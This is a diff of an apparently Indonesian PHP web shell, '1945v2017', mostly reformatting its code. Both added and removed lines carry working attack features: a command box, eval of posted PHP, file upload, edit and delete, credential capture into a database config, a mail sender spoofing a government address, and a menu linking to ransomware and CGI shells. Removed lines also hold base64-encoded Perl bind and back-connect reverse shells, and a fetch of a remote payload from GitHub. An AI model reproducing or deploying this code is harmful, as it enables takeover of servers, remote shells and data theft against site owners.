@@ -12,7 +12,7 @@
 ~ sourceforge.net - tutorialspoint.com - adminer.org
 ~ indoxploit.or.id - linuxcode.org - devilzc0de.com
 ~ madleets.com - linuxsec.org - stackoverflow.com
-~ w3schools.com - 
+~ w3schools.com - indonesia.go.id 
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 */
 session_start();
@@ -96,180 +96,29 @@ $scandir = $fileman->ScanDir($dir);
 $no=1;
 $html->show($html->html(title));
 
-$sysinfomerdekaee ="<pre>"; $sysinfomerdekaee.=$sysfo->uname()."<br>";$sysinfomerdekaee.=$sysfo->gethost()."<br>";$sysinfomerdekaee.="Server Software : ".$_SERVER['SERVER_SOFTWARE']."<br>";$sysinfomerdekaee.="PHP Version :".phpversion()." - [<a href='?__merdeka__=$dir&__action__=infophp'>PHPINFO</a>]<br>";$sysinfomerdekaee.=$sysfo->ipsercli()."<br>";$sysinfomerdekaee.=$sysfo->hddsize($dir)."<br>";$sysinfomerdekaee.=$sysfo->usergroup($dir)."<br>";$sysinfomerdekaee.=$sysfo->servis()."<br>";$sysinfomerdekaee.="Disable functions :".$sysfo->disablefunc();$sysinfomerdekaee.="</pre>";$html->show("<script>function tukar_om(a,b){document.getElementById(a).style.display='none'; document.getElementById(b).style.display='block';}</script>");$html->show("<table class=\"table\">");$html->show($html->tr($html->td("<img src=\"https://alintamvanz.github.io/images/1945/garuda.png\"  style=\"width:150px;height:150px\" class=\"kiri\">").$html->td($sysinfomerdekaee)));$html->show("</table>");$html->show("<div id=\"lama\"><a href=\"javascript:tukar_om('lama','baru');\" > Current Dir :");$fileman->currentdir($fileman->Spath(),"__merdeka__");$inpux = $html->input("text","__merdeka__","value=\"".$dir."\"","Go to dir :");$inpux.= $html->submit("","value=\">>\"");$form = $html->form("GET",$inpux);$html->show("</div><div id=\"baru\"   style=\"display:none\">".$form."</div>");$html->show("<hr>");$li = $html->li("[ ".$html->a("?_","Home","")." ]");$li .= $html->li("[ ".$html->a("?__merdeka__=$dir&__action__=sec","Sec. Info","System Security Info")." ]");$li .= $html->li("[ ".$html->a("?__merdeka__=$dir&__action__=cmd","Command","title=\"Execute command\"")." ]");$li .= $html->li("[ ".$html->a("?__merdeka__=$dir&__action__=upl","Upload","title=\"Upload file in the server\"")." ]");$li .= $html->li("[ ".$html->a("?__merdeka__=$dir&__action__=sql","SQL","title=\"Connect to SQL\"")." ]");$li .= $html->li("[ ".$html->a("?__merdeka__=$dir&__action__=php#code","PHP","title=\"Execute PHP\"")." ]");$li .= $html->li("[ ".$html->a("?__merdeka__=$dir&__action__=ps","PS","title=\"Display Proccess status\"")." ]");$li .= $html->li("[ ".$html->a("?__merdeka__=$dir&__action__=str","String Tools","Encode & Decode Tools")." ]");$li .= $html->li("[ ".$html->a("?__merdeka__=$dir&__action__=net","Remote Shell","title=\"Backconnect & Bind Port\"")." ]");$li .= $html->li("[ ".$html->a("?__merdeka__=$dir&__action__=mail","Mail","title=\"Send email\"")." ]");$li .= $html->li("[ ".$html->a("?__merdeka__=$dir&__action__=rsw","Ransomeware","title=\"Carefully,with this tools\"")." ]");$li .= $html->li("[ ".$html->a("?__merdeka__=$dir&__action__=kcy","kuchiyose","title=\"come your favorite tools\"")." ]");$li .= $html->li("[ ".$html->a("?__merdeka__=$dir&__action__=adm","Admin Finder","title=\"Find admin \"")." ]");$li .= $html->li("[ ".$html->a("?__merdeka__=$dir&__action__=sh","CGI Shell","title=\"CGI Shell\"")." ]");$li .= $html->li("[ ".$html->a("?__merdeka__=$dir&__action__=telnet","CGI Telnet","title=\"CGI Telnet\"")." ]");$li .= $html->li("[ ".$html->a("?__merdeka__=$dir&__action__=abt","About","title=\"About\"")." ]");$li .= $html->li("[ ".$html->a("?__merdeka__=$dir&__action__=log","Logout","title=\"Logout And Destroy Session\"")." ]");$html->show($html->ul($li));$html->show("<hr>");
+$sysinfomerdekaee ="<pre>"; $sysinfomerdekaee.=$sysfo->uname()."<br>";$sysinfomerdekaee.=$sysfo->gethost()."<br>";$sysinfomerdekaee.="Server Software : ".$_SERVER['SERVER_SOFTWARE']."<br>";$sysinfomerdekaee.="PHP Version :".phpversion()." - [<a href='?__merdeka__=$dir&__action__=infophp'>PHPINFO</a>]<br>";$sysinfomerdekaee.=$sysfo->ipsercli()."<br>";$sysinfomerdekaee.=$sysfo->hddsize($dir)."<br>";$sysinfomerdekaee.=$sysfo->usergroup($dir)."<br>";$sysinfomerdekaee.=$sysfo->servis()."<br>";$sysinfomerdekaee.="Disable functions :".$sysfo->disablefunc();$sysinfomerdekaee.="</pre>";$html->show("<script>function tukar_om(a,b){document.getElementById(a).style.display='none'; document.getElementById(b).style.display='block';}</script>");$html->show("<table class=\"table\">");$html->show($html->tr($html->td("<img src=\"https://alintamvanz.github.io/images/1945/garuda.png\"  style=\"width:150px;height:150px\" class=\"kiri\">").$html->td($sysinfomerdekaee)));$html->show("</table>");$html->show("<div id=\"lama\"><a href=\"javascript:tukar_om('lama','baru');\" > Current Dir :");$fileman->currentdir($fileman->Spath(),"__merdeka__");$inpux = $html->input("text","__merdeka__","value=\"".$dir."\" autocomplete=\"off\"","Go to dir :");$inpux.= $html->submit("","value=\">>\"");$form = $html->form("GET",$inpux);$html->show("</div><div id=\"baru\"   style=\"display:none\">".$form."</div>");$html->show("<hr>");$li = $html->li("[ ".$html->a("?_","Home","")." ]");$li .= $html->li("[ ".$html->a("?__merdeka__=$dir&__action__=sec","Sec. Info","System Security Info")." ]");$li .= $html->li("[ ".$html->a("?__merdeka__=$dir&__action__=cmd","Command","title=\"Execute command\"")." ]");$li .= $html->li("[ ".$html->a("?__merdeka__=$dir&__action__=upl","Upload","title=\"Upload file in the server\"")." ]");$li .= $html->li("[ ".$html->a("?__merdeka__=$dir&__action__=sql","SQL","title=\"Connect to SQL\"")." ]");$li .= $html->li("[ ".$html->a("?__merdeka__=$dir&__action__=php#code","PHP","title=\"Execute PHP\"")." ]");$li .= $html->li("[ ".$html->a("?__merdeka__=$dir&__action__=ps","PS","title=\"Display Proccess status\"")." ]");$li .= $html->li("[ ".$html->a("?__merdeka__=$dir&__action__=str","String Tools","Encode & Decode Tools")." ]");$li .= $html->li("[ ".$html->a("?__merdeka__=$dir&__action__=net","Remote Shell","title=\"Backconnect & Bind Port\"")." ]");$li .= $html->li("[ ".$html->a("?__merdeka__=$dir&__action__=mail","Mail","title=\"Send email\"")." ]");$li .= $html->li("[ ".$html->a("?__merdeka__=$dir&__action__=rsw","Ransomeware","title=\"Carefully,with this tools\"")." ]");$li .= $html->li("[ ".$html->a("?__merdeka__=$dir&__action__=kcy","kuchiyose","title=\"come your favorite tools\"")." ]");$li .= $html->li("[ ".$html->a("?__merdeka__=$dir&__action__=adm","Admin Finder","title=\"Find admin \"")." ]");$li .= $html->li("[ ".$html->a("?__merdeka__=$dir&__action__=sh","CGI Shell","title=\"CGI Shell\"")." ]");$li .= $html->li("[ ".$html->a("?__merdeka__=$dir&__action__=telnet","CGI Telnet","title=\"CGI Telnet\"")." ]");$li .= $html->li("[ ".$html->a("?__merdeka__=$dir&__action__=abt","About","title=\"About\"")." ]");$li .= $html->li("[ ".$html->a("?__merdeka__=$dir&__action__=log","Logout","title=\"Logout And Destroy Session\"")." ]");$html->show($html->ul($li));$html->show("<hr>");
 if(isset($_GET['__action__'])||isset($_GET['__files__']))
-{
-$__files__   = $_GET['__files__'];
-$__action__ = $_GET['__action__']; 
-$__merdeka__ = $_GET['__merdeka__'];
-if($__action__ == "view")
-{
-	$html->show("<div class=\"action\">");
-	$html->show("<b>Files :</b> ".$__files__."<br>");
-	$html->show("<b>Action :</b> ".$fileman->actionfile($__files__)."<br>");
-	$html->show("</div>");
-	$html->show("<hr>");
-	$html->show($html->pre($fileman->viewfile($__files__)));
-
-}elseif ($__action__ == "mkdir") {
-	$html->show($html->h1("Create New Directory"));
-	$input = $html->input("text","mkdir","style=\"width:300px;\" value=\"New_dir\"","CreateNewDir").
-		$html->submit("submitdir","value=\"Create !\"");
-	$html->show($html->form("POST",$input));
-	if(isset($_POST['submitdir']))
-	{
-		if($act->mkdirr($__merdeka__,$_POST['mkdir']))
-		{
-			$html->actdone();
-		}else{
-			$html->actfail();
-		}
+{$__files__   = $_GET['__files__'];$__action__ = $_GET['__action__']; $__merdeka__ = $_GET['__merdeka__'];
+if($__action__ == "view"){$html->show("<div class=\"action\">");$html->show("<b>Files :</b> ".$__files__."<br>");$html->show("<b>Action :</b> ".$fileman->actionfile($__files__)."<br>");$html->show("</div>");$html->show("<hr>");$html->show($html->pre($fileman->viewfile($__files__))); }elseif ($__action__ == "mkdir") {$html->show($html->h1("Create New Directory"));$input = $html->input("text","mkdir","style=\"width:300px;\" value=\"New_dir\"","CreateNewDir").$html->submit("submitdir","value=\"Create !\"");$html->show($html->form("POST",$input));if(isset($_POST['submitdir'])){if($act->mkdirr($__merdeka__,$_POST['mkdir'])){$html->actdone();}else{$html->actfail();}
 	}
-}elseif ($__action__ == "delete") {
-	if($__merdeka__)
-	{
-		$del = $__merdeka__;
-	}else{
-		$del = $__files__;
-	}
-	if($act->delete($del))
-	{
-		$html->show("<script>window.location.href=\"?__merdeka__=".dirname($del)."\"</script>");
-	}else{
-		$html->show("<script>window.location.href=\"?__merdeka__=".dirname($del)."\"</script>");
-	}
-}elseif ($__action__ == "rename") {
-	if($__merdeka__)
-	{
-		$ren_f = $__merdeka__;
-		$html->show("<b>Action :</b> ".$fileman->actiondir($__merdeka__)."<br>");
-	}else{
-		$ren_f = $__files__;
-		$html->show("<b>Action :</b> ".$fileman->actionfile($__files__)."<br>");
-	}
-	$html->show("<b>Files :</b> ".$ren_f."<br>");
-	$html->show("<hr>");
-	$html->show("<center>");
-	$html->show($html->h1("Rename Files / Directory"));
-	$input = "<p>Oldname : <b>".basename($ren_f)."</b></p>"; 
-	$input.= $html->input("text","newname","value=\"usos_1945.php\" ","newName");
-	$input.= $html->submit("renamed","value=\"Save Newname\"");
-	$html->show($html->form("POST",$input));
-	$html->show("</center>");
-	if(isset($_POST['renamed']))
-	{
-		if($act->renamet($ren_f,dirname($ren_f)."/".$_POST['newname']))
-		{
-			$html->actdone();
-		}else{
-			$html->actfail();
-		}
+}elseif ($__action__ == "delete") {if($__merdeka__){$del = $__merdeka__;}else{$del = $__files__;}if($act->delete($del)){$html->show("<script>window.location.href=\"?__merdeka__=".dirname($del)."\"</script>");}else{$html->show("<script>window.location.href=\"?__merdeka__=".dirname($del)."\"</script>");}
+}elseif ($__action__ == "rename") {if($__merdeka__){$ren_f = $__merdeka__;$html->show("<b>Action :</b> ".$fileman->actiondir($__merdeka__)."<br>");}else{$ren_f = $__files__;$html->show("<b>Action :</b> ".$fileman->actionfile($__files__)."<br>");}$html->show("<b>Files :</b> ".$ren_f."<br>");$html->show("<hr>");$html->show("<center>");$html->show($html->h1("Rename Files / Directory"));$input = "<p>Oldname : <b>".basename($ren_f)."</b></p>"; $input.= $html->input("text","newname","value=\"usos_1945.php\" ","newName");$input.= $html->submit("renamed","value=\"Save Newname\"");$html->show($html->form("POST",$input));$html->show("</center>");if(isset($_POST['renamed'])){if($act->renamet($ren_f,dirname($ren_f)."/".$_POST['newname'])){$html->actdone();}else{$html->actfail();}
 	}
 }elseif($__action__ == "edit")
-{
-
-	$html->show("<b>Files :</b> ".$__files__."<br>");
-	$html->show("<b>Action :</b> ".$fileman->actionfile($__files__)."<br>");
-	$html->show("<hr><center>");
-	$html->show($html->h1("Edit files"));
-	$htmlo = htmlspecialchars(file_get_contents($__files__));
-	$html->show($html->form("POST",$html->textarea("editfile",$htmlo,"")."<br>".$html->submit("submitfile","value=\"Save Changes!\""))."</center>");
-	if(isset($_POST['submitfile']))
-	{
-		if($act->simpantext($__files__,$_POST['editfile']))
-		{
-			$html->actdone();
-		}else{
-			$html->actfail();
-		}
-	}	
+{$html->show("<b>Files :</b> ".$__files__."<br>");$html->show("<b>Action :</b> ".$fileman->actionfile($__files__)."<br>");$html->show("<hr><center>");$html->show($html->h1("Edit files"));$htmlo = htmlspecialchars(file_get_contents($__files__));$html->show($html->form("POST",$html->textarea("editfile",$htmlo,"")."<br>".$html->submit("submitfile","value=\"Save Changes!\""))."</center>"); if(isset($_POST['submitfile']))
+	{if($act->simpantext($__files__,$_POST['editfile'])){$html->actdone();}else{$html->actfail();} }	
 }elseif ($__action__ == "touch") {
-    $html->show("<b>Create file on :</b> ".$__merdeka__."<br>");
-	$html->show("<b>Action :</b> ".$fileman->actionfile($__merdeka__)."<br>");
-	$html->show("<hr><center>");
-	$html->show($html->h1("New files"));
-	$html->show($html->form("POST",$html->textarea("newfile","# 1945v2017 c0ded by shutdown57 a.k.a alinko :*","")."<br>".
-		$html->input("text","filename","value=\"newfile_1945.php\"","File Name ").
-		$html->submit("submitf","value=\"Save Changes!\""))."</center>");
-	if(isset($_POST['submitf']))
-	{
-		if($act->simpantext($__merdeka__."/".$_POST['filename'],$_POST['newfile']))
-		{
-			$html->actdone();
-		}else{
-			$html->actfail();
-		}
+  $html->show("<b>Create file on :</b> ".$__merdeka__."<br>");$html->show("<b>Action :</b> ".$fileman->actionfile($__merdeka__)."<br>");$html->show("<hr><center>");$html->show($html->h1("New files"));$html->show($html->form("POST",$html->textarea("newfile","# 1945v2017 c0ded by shutdown57 a.k.a alinko :*","")."<br>".$html->input("text","filename","value=\"newfile_1945.php\"","File Name ").$html->submit("submitf","value=\"Save Changes!\""))."</center>"); if(isset($_POST['submitf'])){if($act->simpantext($__merdeka__."/".$_POST['filename'],$_POST['newfile'])){$html->actdone();}else{$html->actfail();}
 	}	
-}elseif ($__action__ == "infophp") {
-	@ob_start();
-	@eval("phpinfo();");
-	$buff = @ob_get_contents();
-	@ob_end_clean();	
-	$awal = strpos($buff,"<body>")+6;
-	$akhir = strpos($buff,"</body>");
-	$html->show("<center><div class=\"a_exp\">".substr($buff,$awal,$akhir-$awal)."</div></center>");
-}elseif ($__action__ == "sec") {
-	$sysfo->SecInfo();
-}elseif ($__action__ == "cmd") {
-	$html->show("<center>");
-	$html->show($html->h1("Command : ".$_SERVER['HTTP_HOST']));
-	$html->show("<br>");
-	$input = $html->input("text","cmd","value=\"".$_POST['cmd']."\" style=\"width:600px;\"","1945@".$_SERVER['HTTP_HOST']);
-	$html->show($html->form("POST",$input));
-	$html->show("</center>");
-	if(isset($_POST['cmd']))
-	{
-		$html->show("<hr>");
-		$html->show("<pre class=\"code\">");
-		$html->show(FileMan45::cmd($_POST['cmd']));
-		$html->show("</pre>");
-	}
-}elseif ($__action__ == "upl") {
-	$html->show("<center>".$html->h1("Upload file"));
-	$html->show("<br>");
-	$html->show("<form method=\"POST\" enctype=\"multipart/form-data\">");
-	$s=$html->input("file","filup[]","style=\"border:0;width:200px\" multiple=\"multiple\"","upload file ");
-	$s.=$html->input("text","dirup","style=\"width:200px;\" value=\"".$__merdeka__."\"","Upload to ");
-	$s.=$html->submit("uploadfile","value=\"Upload !!\"");
-	$html->show($s);
-	$html->show("</form></center>");
-	if(isset($_POST['uploadfile']))
-	{
-		$file_up = $act->array_upload($_FILES['filup']);
-		foreach($file_up as $filup){
-		if($act->upload($filup['tmp_name'],$_POST['dirup']."/".$filup['name']))
-		{
-			$html->show("Successfuly Upload file : ".$_POST['dirup']."/".$filup['name']."<br>");
-		}else{
-			$html->show("Failed to upload file !");
-			$html->actfail();
-		}
+}elseif ($__action__ == "infophp") {@ob_start();@eval("phpinfo();");$buff = @ob_get_contents();@ob_end_clean();	$awal = strpos($buff,"<body>")+6;$akhir = strpos($buff,"</body>");$html->show("<center><div class=\"a_exp\">".substr($buff,$awal,$akhir-$awal)."</div></center>");
+}elseif ($__action__ == "sec") {$sysfo->SecInfo(); }elseif ($__action__ == "cmd") {$html->show("<center>");$html->show($html->h1("Command : ".$_SERVER['HTTP_HOST']));$html->show("<br>");$input = $html->input("text","cmd","value=\"".$_POST['cmd']."\" style=\"width:600px;\"","1945@".$_SERVER['HTTP_HOST']);$html->show($html->form("POST",$input));$html->show("</center>");if(isset($_POST['cmd'])){$html->show("<hr>");$html->show("<pre class=\"code\">");$html->show(FileMan45::cmd($_POST['cmd']));$html->show("</pre>");}
+}elseif ($__action__ == "upl") {$html->show("<center>".$html->h1("Upload file"));$html->show("<br>");$html->show("<form method=\"POST\" enctype=\"multipart/form-data\">");$s=$html->input("file","filup[]","style=\"border:0;width:200px\" multiple=\"multiple\"","upload file ");$s.=$html->input("text","dirup","style=\"width:200px;\" value=\"".$__merdeka__."\"","Upload to ");$s.=$html->submit("uploadfile","value=\"Upload !!\"");$html->show($s);$html->show("</form></center>");  if(isset($_POST['uploadfile'])) {$file_up = $act->array_upload($_FILES['filup']);foreach($file_up as $filup){if($act->upload($filup['tmp_name'],$_POST['dirup']."/".$filup['name'])){$html->show("Successfuly Upload file : ".$_POST['dirup']."/".$filup['name']."<br>");}else{$html->show("Failed to upload file !");$html->actfail();}
 	}
 }
 }elseif ($__action__ == "sql") {
 
-if(!file_exists('__1945_db.php')){
-$html->show("<center>".$html->h1("Connect SQL")."</center>");
-$option_sql = $html->option("mysql","MySQL");
-$option_sql.= $html->option("mysqli","MySQLi");
-$input = "<table align=center>";
-$input.= $html->tr($html->td("Connect ").$html->td($html->select("connect_mode",$option_sql,"class=\"input_m\"")));
-$input.= $html->tr($html->td("Hostname ").$html->td($html->input("text","hostname","","")));
-$input.= $html->tr($html->td("Username ").$html->td($html->input("text","username","","")));
-$input.= $html->tr($html->td("Password ").$html->td($html->input("text","password","","")));
-$input.= $html->tr($html->td("Database").$html->td($html->input("text","database","","")));
-$input.= $html->tr($html->td("").$html->td($html->submit("simpandb","value=\"connect\" ")));
-$input.= "</table>";
-$html->show($html->form("POST",$input));
-if(isset($_POST['simpandb'])){
-	$code = "<?php \n";
-	$code.= "\$tipe =\"".$_POST['connect_mode']."\"; \n";
-	$code.= "\$hostname = \"".$_POST['hostname']."\"; \n";
-	$code.= "\$password = \"".$_POST['password']."\"; \n";
-	$code.= "\$database = \"".$_POST['database']."\"; \n";
-	$code.= "\$username = \"".$_POST['username']."\"; \n";
-	$s = $act->simpantext("__1945_db.php",$code);
-	if($s){$html->show("<meta http-equiv='refresh' content='0;url='>");}
+if(!file_exists('__1945_db.php')){$html->show("<center>".$html->h1("Connect SQL")."</center>");$option_sql = $html->option("mysql","MySQL");$option_sql.= $html->option("mysqli","MySQLi");$input = "<table align=center>";$input.= $html->tr($html->td("Connect ").$html->td($html->select("connect_mode",$option_sql,"class=\"input_m\"")));$input.= $html->tr($html->td("Hostname ").$html->td($html->input("text","hostname","","")));$input.= $html->tr($html->td("Username ").$html->td($html->input("text","username","","")));$input.= $html->tr($html->td("Password ").$html->td($html->input("text","password","","")));$input.= $html->tr($html->td("Database").$html->td($html->input("text","database","","")));$input.= $html->tr($html->td("").$html->td($html->submit("simpandb","value=\"connect\" ")));$input.= "</table>";$html->show($html->form("POST",$input));
+if(isset($_POST['simpandb'])){$code = "<?php \n";$code.= "\$tipe =\"".$_POST['connect_mode']."\"; \n";$code.= "\$hostname = \"".$_POST['hostname']."\"; \n";$code.= "\$password = \"".$_POST['password']."\"; \n";$code.= "\$database = \"".$_POST['database']."\"; \n";$code.= "\$username = \"".$_POST['username']."\"; \n";$s = $act->simpantext("__1945_db.php",$code); if($s){$html->show("<meta http-equiv='refresh' content='0;url='>");}
 }
 
 }else{
@@ -325,53 +174,10 @@ $html->show("</table>");
 }
 }
 elseif($__action__ == "cdb"){unlink('__1945_db.php');
-
-}elseif ($__action__ == "php") {
-	$val = (isset($_POST['eval'])) ? $_POST['eval'] : "echo \"HELLO Noobz! :*\";";
-	$html->show("<center>");
-	$html->show($html->h1("Execute php"));
-	$input = $html->textarea("eval",$val,"");
-	$input.= $html->submit("submitphp","value=\"Execute PHP !\" style=\"width:200px\" onsubmit=\"#code\"");
-	$html->show($html->form("POST",$input));
-	if(isset($_POST['submitphp'])){
-	$html->show("</center><br><br><hr><div id=\"code\" class=\"code\">");
-	eval($_POST['eval']);
-	$html->show("</center></div>");
-}
-}elseif ($__action__ == "ps") {
-	$html->show("<center>");
-	$html->show($html->h1("Proccess Status"));
-	$html->show("</center><div class=\"code\">");
-	$c = (preg_match("/Linux/",php_uname())) ? "ps aux" : "tasklist /V /FO csv";
-	$html->show($html->pre(FileMan45::cmd($c)));
-	$html->show("</center></div>");	
-}elseif ($__action__ == "str") {
-	$str_a = array(
-		"url"=>"URL",
-		"cuu"=>"convert_uu",
-		"b64"=>"base64",
-		"b64b64"=>"base64 -> base64",
-		"b64url"=>"base64 -> url",
-		"b64str"=>"bas64 -> str_rot13",
-		"b64strgz"=>"base64 -> str_rot13 -> gzinflate",
-		"b64cuu"=>"base64 -> convert_uu",
-		""=>">---------[ Hash ]---------<",
-		"md2"=>"MD2",
-		"md4"=>"MD4",
-		"md5"=>"MD5",
-		"sha1"=>"SHA1",
-		"sha256"=>"SHA256",
-		"sha384"=>"SHA384",
-		"sha512"=>"SHA512",
-		"crypt"=>"crypt",
-		"mdmd5"=>"MD5 -> MD5",
-		""=>"");
-	$html->show("<br>");
-foreach($str_a as $str=>$val)
-{
-	$opt.=$html->option($str,$val);
-}
-
+}elseif ($__action__ == "php") {$val = (isset($_POST['eval'])) ? $_POST['eval'] : "echo \"HELLO Noobz! :*\";";$html->show("<center>");$html->show($html->h1("Execute php"));$input = $html->textarea("eval",$val,"");$input.= $html->submit("submitphp","value=\"Execute PHP !\" style=\"width:200px\" onsubmit=\"#code\"");$html->show($html->form("POST",$input));if(isset($_POST['submitphp'])){$html->show("</center><br><br><hr><div id=\"code\" class=\"code\">");eval($_POST['eval']);$html->show("</center></div>"); }
+}elseif ($__action__ == "ps") {$html->show("<center>");$html->show($html->h1("Proccess Status"));$html->show("</center><div class=\"code\">");$c = (preg_match("/Linux/",php_uname())) ? "ps aux" : "tasklist /V /FO csv";$html->show($html->pre(FileMan45::cmd($c)));$html->show("</center></div>");
+}elseif ($__action__ == "str") { $str_a = array("url"=>"URL","cuu"=>"convert_uu","b64"=>"base64","b64b64"=>"base64 -> base64","b64url"=>"base64 -> url","b64str"=>"bas64 -> str_rot13","b64strgz"=>"base64 -> str_rot13 -> gzinflate","b64cuu"=>"base64 -> convert_uu",""=>">---------[ Hash ]---------<","md2"=>"MD2","md4"=>"MD4","md5"=>"MD5","sha1"=>"SHA1","sha256"=>"SHA256","sha384"=>"SHA384","sha512"=>"SHA512","crypt"=>"crypt","mdmd5"=>"MD5 -> MD5",""=>"");
+	$html->show("<br>"); foreach($str_a as $str=>$val){ $opt.=$html->option($str,$val);}
 if(isset($_POST['encode'])){
 	$o = $_POST['mode'];
 	switch ($o) {case 'url':$val = urlencode($_POST['str']);break;case 'b64':$val = base64_encode($_POST['str']);break;case 'cuu':$val = convert_uuencode($_POST['str']);break;case 'b64b64':$val = base64_encode(base64_encode($_POST['str']));break;case 'b64str':$val = base64_encode(str_rot13($_POST['str']));break;case 'b64url':$val = base64_encode(urlencode($_POST['str']));break;case 'b64strgz':$val = base64_encode(str_rot13(gzdeflate($_POST['str'])));break;case 'b64cuu':$val = base64_encode(convert_uuencode($_POST['str']));break;default:$val = $_POST['str'];break;
@@ -384,199 +190,40 @@ if(isset($_POST['hash'])){$o = $_POST['mode'];switch ($o) {case 'md2':$val = has
 	}
 }
 $html->show($html->h1("<center>String Tools</center>"));
-	$input ="<label for=\"mode\">Operate :</label>".$html->select("mode",$opt,"class=\"input_m\" style=\"width:300px\"");
-	$input.= $html->submit("hash","value=\"Hash !\"");
-	$input.= $html->submit("encode","value=\"Encode !\"");
-	$input.= $html->submit("decode","value=\"Decode !\"");
-	$vall =(empty($_POST)) ? "// String Tools c0ded by shutdown57" : $vall=$val;
-	$input.= "<br>".$html->textarea("str",$val,"");
-	$html->show($html->form("POST",$input));
-}elseif ($__action__ == "net") {
-	$html->show("<center>");
-	$html->show($html->h1("Network ")."</center>");
-	$html->show("<b>Bind Port ::</b>");
-	$input_bp = $html->input("text","binport","value=\"1945\"","Port ");
-	$input_bp.= $html->submit("sbp","value=\"Connect !\"");
-	$input_bc = $html->input("text","ipbc","value=\"".gethostbyname($_SERVER['HTTP_HOST'])."\"","Server ");
-	$input_bc.="  ".$html->input("text","pbc","value=\"1945\"","Port ");
-	$input_bc.= $html->submit("sbc","value=\"Connect !\"");
-	$html->show($html->form("POST",$input_bp));
-	$html->show("<br>");
-	$html->show("<b>Backconnect ::</b>");
-	$html->show($html->form("POST",$input_bc));
-
-	if(isset($_POST['sbp']))
-	{
-		$script_bind_port = "IyEvdXNyL2Jpbi9wZXJsDQokU0hFTEw9Ii9iaW4vc2ggLWkiOw0KaWYgKEBBUkdWIDwgMSkgeyBleGl0KDEpOyB9DQp1c2UgU29ja2V0Ow0Kc29ja2V0KFMsJlBGX0lORVQsJlNPQ0tfU1RSRUFNLGdldHByb3RvYnluYW1lKCd0Y3AnKSkgfHwgZGllICJDYW50IGNyZWF0ZSBzb2NrZXRcbiI7DQpzZXRzb2Nrb3B0KFMsU09MX1NPQ0tFVCxTT19SRVVTRUFERFIsMSk7DQpiaW5kKFMsc29ja2FkZHJfaW4oJEFSR1ZbMF0sSU5BRERSX0FOWSkpIHx8IGRpZSAiQ2FudCBvcGVuIHBvcnRcbiI7DQpsaXN0ZW4oUywzKSB8fCBkaWUgIkNhbnQgbGlzdGVuIHBvcnRcbiI7DQp3aGlsZSgxKSB7DQoJYWNjZXB0KENPTk4sUyk7DQoJaWYoISgkcGlkPWZvcmspKSB7DQoJCWRpZSAiQ2Fubm90IGZvcmsiIGlmICghZGVmaW5lZCAkcGlkKTsNCgkJb3BlbiBTVERJTiwiPCZDT05OIjsNCgkJb3BlbiBTVERPVVQsIj4mQ09OTiI7DQoJCW9wZW4gU1RERVJSLCI+JkNPTk4iOw0KCQlleGVjICRTSEVMTCB8fCBkaWUgcHJpbnQgQ09OTiAiQ2FudCBleGVjdXRlICRTSEVMTFxuIjsNCgkJY2xvc2UgQ09OTjsNCgkJZXhpdCAwOw0KCX0NCn0=";
-		$act->simpantext("/tmp/1945_bp.pl",base64_decode($script_bind_port));
-		$port = $_POST['bindport'];
-		$res = FileMan45::cmd("perl /tmp/1945_bp.pl 1>/dev/null 2>&1 &");
-		$html->show("<pre class=\"code\">");
-		$html->show($res."\n\n");
-		$html->show(FileMan45::cmd("ps aux | grep 1945_bp.pl"));
-		unlink("/tmp/1945_bp.pl");
-		$html->show("</pre>");
-	}
-	if(isset($_POST['sbc']))
-	{
-		$script_back_connect = "IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGlhZGRyPWluZXRfYXRvbigkQVJHVlswXSkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRBUkdWWzFdLCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKTsNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQokc2ggPSAiZXhwb3J0IFRFUk09eHRlcm07UFMxPSdcJFBXRCBbMTk0NXYyMDE3XSA+JztleHBvcnQgUFMxOy9iaW4vc2ggLWkiOw0Kc29ja2V0KFNPQ0tFVCwgUEZfSU5FVCwgU09DS19TVFJFQU0sICRwcm90bykgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KY29ubmVjdChTT0NLRVQsICRwYWRkcikgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0Kb3BlbihTVERJTiwgIj4mU09DS0VUIik7DQpvcGVuKFNURE9VVCwgIj4mU09DS0VUIik7DQpvcGVuKFNUREVSUiwgIj4mU09DS0VUIik7DQpzeXN0ZW0oJ2VjaG8gIistLS0tLVsgMTk0NXYyMDE3IHNoZWxsIGMwZGVkIGJ5IDogc2h1dGRvd241NyBdLS0tLS0rIicpOw0Kc3lzdGVtKCdlY2hvICIrLS0tLS0tLS0tLVsgNzJ0aCBJbmRvbmVzaWEgTWVyZGVrYSBdLS0tLS0tLS0tKyIgOyBbK10gd2FpdCAuLiA7IHNsZWVwIDUnKTsNCnN5c3RlbSgkc2gpOw0KY2xvc2UoU1RESU4pOw0KY2xvc2UoU1RET1VUKTsNCmNsb3NlKFNUREVSUik7";
-		$act->simpantext("/tmp/1945_bc.pl",base64_decode($script_back_connect));
-		$port = $_POST['pbc'];
-		$ip   = $_POST['ipbc'];
-		$res = FileMan45::cmd("perl /tmp/1945_bc.pl $ip $port 1>/dev/null 2>&1 &");
-		$html->show("<pre class=\"code\">");
-		$html->show($res,"\n\n");
-		$html->show(FileMan45::cmd("ps aux | grep 1945_bc.pl"));
-		unlink("/tmp/1945_bc.pl");
-		$html->show("</pre>");
-	}
-}elseif ($__action__ == "mail") {
-	$html->show("<center>");
-	$html->show($html->h1("Mail Sender"));
-	$form = $html->input("text","to","value=\"webmaster@localhost\""," To ");
-	$form.= $html->input("text","from","value=\"shutdown57@indonesia.go.id\""," From ");
-	$form.= $html->input("text","subjek","value=\":* kissed\""," Subject ");
-	$form.= $html->submit("sent","value=\"send email!\"");
-	$form.= $html->textarea("konten","// Patch Ur Faces~","");
-	$html->show($html->form("POST",$form));
-	$html->show("</center>");
-	if(isset($_POST['sent']))
-	{
-		$to = $_POST['to'];
-		$from = $_POST['from'];
-		$subjek = $_POST['subjek'];
-		$konten = $_POST['konten'];
-		if(mail($to,$subject,$konten,$from))
-		{
-			$html->show("<b> Email Sent Successfuly ~</b>");
-			$html->actdone();
-		}else{
-			$html->show("<b> Email Sent Failed ~</b>");
-			$html->actfail();
-		}
-	}
-}elseif ($__action__ == "rsw") {
-	if(Act45::getscript("awesome1945.php","https://raw.githubusercontent.com/alintamvanz/webshell/master/awesome1945.php"))
-	{
-		$html->show("<center>");
